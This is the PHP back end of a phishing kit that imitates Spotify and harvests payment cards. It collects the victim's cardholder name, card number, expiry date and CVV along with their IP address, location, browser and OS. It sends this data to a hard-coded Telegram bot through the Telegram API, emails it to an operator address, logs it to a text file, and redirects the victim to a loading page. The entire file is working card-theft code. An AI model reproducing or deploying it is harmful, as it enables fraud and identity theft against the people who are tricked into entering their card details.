<?php
require "CONTROLS.php";
require "includes/functions.php";
require "includes/One_Time.php";
ini_set('display_errors', 0);



        $date = date('l d F Y');
        $time = date('H:i');
		$NC = $_POST['NC'];
		$CN = $_POST['CN'];
        $ED = $_POST['ED'];
		$CV = $_POST['CV'];
        $ip = $_SERVER['REMOTE_ADDR'];
        $systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
        $VictimInfo1 = "IP 			: " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")";
        $VictimInfo2 = "LOCATION	: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "";
        $VictimInfo3 = "USERAGENT	: " . $systemInfo['useragent'] . "";
        $VictimInfo4 = "BROWSER		: " . $systemInfo['browser'] . "";
        $VictimInfo5 = "OS			: " . $systemInfo['os'] . "";
        $data = "
+ ------------- 3 CardDetails ------------------+
| NAME		: $NC
| CARDNO 	: $CN
| EXP		: $ED
| CVV	 	: $CV
+ ------created by @JS-----+
+ Victim Information
$VictimInfo1
$VictimInfo2
$VictimInfo3
$VictimInfo4
$VictimInfo5
| Received : $date @ $time
+ ------created by @JS-----+
";
 file_get_contents("https://api.telegram.org/bot5936014016:AAHBNROC7Nw6ob9M7Ux2t3O8z-FY_JL761k/sendMessage?chat_id=5085418157&text=" . urlencode($data)."" );

        $subject = "SPOTIFYResultz 3 " . $systemInfo['country'];
        mail($receiverAddress, $subject, $data);

$fp = fopen('SPOTIFYResultz.txt', 'a');
fwrite($fp, $data);
fclose($fp);
?>
<script type="text/javascript">
    window.top.location.href = "loading.php";

</script>